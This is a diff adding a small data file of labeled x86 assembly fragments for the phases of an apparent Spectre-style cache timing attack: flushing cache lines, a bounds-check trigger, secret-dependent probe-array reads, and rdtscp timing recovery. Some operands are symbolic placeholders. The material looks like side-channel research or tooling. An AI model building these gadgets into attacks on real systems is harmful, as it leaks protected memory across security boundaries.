@@ -1,0 +1,4 @@
+prepare|clflush	DS:[rax]
+trigger|mov	eax, DS:[rip + 0x200a94]#mov	eax, eax#cmp	DS:[rbp + 0xffffffffffffffe8], rax#jnb	0x44
+encode|mov rax, DS:[rbp + 0xffffffffffffffe8]#sub eax, 0x1#mov DS:[rbp + 0xfffffffffffffffc], eax#jmp 0x32#mov eax, DS:[rbp + 0xfffffffffffffffc]#cdqe rax#movzx eax, DS:[rax + 0x601080]#movzx eax, eax#sal eax, 0x9#cdqe rax#movzx edx, DS:[rax + 0x6015c0]#movzx eax, DS:[t7 + 0x200b5e]#and eax, edx#mov DS:[t7 + 0x200b56], al#sub DS:[rbp + 0xfffffffffffffffc], 0x1#sub DS:[rbp + 0xfffffffffffffff8], 0x1#cmp DS:[rbp + 0xfffffffffffffff8], 0#jns 0xffffffffffffffc8
+recover|rdtscp#mov	esi, ecx#mov	rcx, DS:[rbp + 0xffffffffffffffa8]#mov	DS:[rcx], esi#sal	rdx, 0x20#or	rax, rdx#mov	rbx, rax#mov	rax, DS:[rbp + 0xffffffffffffffd0]#movzx	eax, DS:[rax]#movzx	eax, eax#mov	DS:[rbp + 0xffffffffffffffa4], eax#lea	rax, DS:[rbp + 0xffffffffffffffa4]#mov	DS:[rbp + 0xffffffffffffffb0], rax#rdtscp
